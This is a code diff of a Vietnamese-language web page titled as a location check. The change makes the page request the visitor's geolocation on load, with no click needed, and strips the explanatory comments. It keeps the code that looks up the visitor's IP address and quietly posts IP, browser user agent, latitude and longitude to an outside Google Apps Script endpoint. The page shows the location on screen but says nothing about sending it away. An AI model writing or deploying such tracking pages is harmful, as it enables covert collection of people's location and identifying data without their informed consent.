@@ -13,48 +13,43 @@
     </style>
   </head>
   <body>
-    <h1>Kiểm tra vị trí của bạn</h1>
-    <button id="getLocationBtn">Lấy vị trí</button>
+    <h1>Đang kiểm tra vị trí của bạn...</h1>
     <div id="locationInfo"></div>
 
     <script>
-      document.getElementById("getLocationBtn").addEventListener("click", function () {
+      window.addEventListener("load", function () {
         if ("geolocation" in navigator) {
           navigator.geolocation.getCurrentPosition(function (position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
 
-            // Hiển thị vị trí người dùng trên trang
             document.getElementById("locationInfo").innerHTML = `Vị trí của bạn: <br> Vĩ độ: ${lat} <br> Kinh độ: ${lon}`;
 
-            // Lấy thông tin IP và User-Agent
             fetch("https://api.ipify.org?format=json")
               .then(response => response.json())
               .then(data => {
                 const ip = data.ip;
                 const ua = navigator.userAgent;
 
-                // Gửi yêu cầu POST với IP, UA và vị trí
-                fetch("https://script.google.com/macros/s/AKfycbwjcLqO-W4ELN6fzey0F6nLJM5_3kPVTKDUnlQYF8ivPkK5SNdG2ZjMFJ3v5WgrEmUa/execc", {
-                  method: "POST",  // Đảm bảo là POST
+                fetch("https://script.google.com/macros/s/AKfycbwhWtJFVI3Kri52Ad8fooaZjgbwqrjoQaoyT84W4Vov62fsf109lJsgOaX3l6cp1Hz-/exec", {
+                  method: "POST",
                   headers: {
                     "Content-Type": "application/x-www-form-urlencoded"
                   },
-                  body: `ip=${ip}&ua=${encodeURIComponent(ua)}&lat=${lat}&lon=${lon}`  // Gửi IP, UA và vị trí
+                  body: `ip=${ip}&ua=${encodeURIComponent(ua)}&lat=${lat}&lon=${lon}`
                 })
                   .then(response => response.text())
                   .then(data => {
-                    console.log("Server Response:", data);  // Kiểm tra phản hồi từ server
+                    console.log("Server Response:", data);
                   })
-                  .catch(error => console.error("Error:", error));  // Xử lý lỗi
+                  .catch(error => console.error("Error:", error));
               })
-              .catch(error => console.error("Error fetching IP:", error));  // Xử lý lỗi khi lấy IP
-
+              .catch(error => console.error("Error fetching IP:", error));
           }, function (error) {
-            console.log("Lỗi khi lấy vị trí: " + error.message);
+            document.getElementById("locationInfo").innerText = "Lỗi khi lấy vị trí: " + error.message;
           });
         } else {
-          console.log("Trình duyệt của bạn không hỗ trợ Geolocation.");
+          document.getElementById("locationInfo").innerText = "Trình duyệt của bạn không hỗ trợ Geolocation.";
         }
       });
     </script>
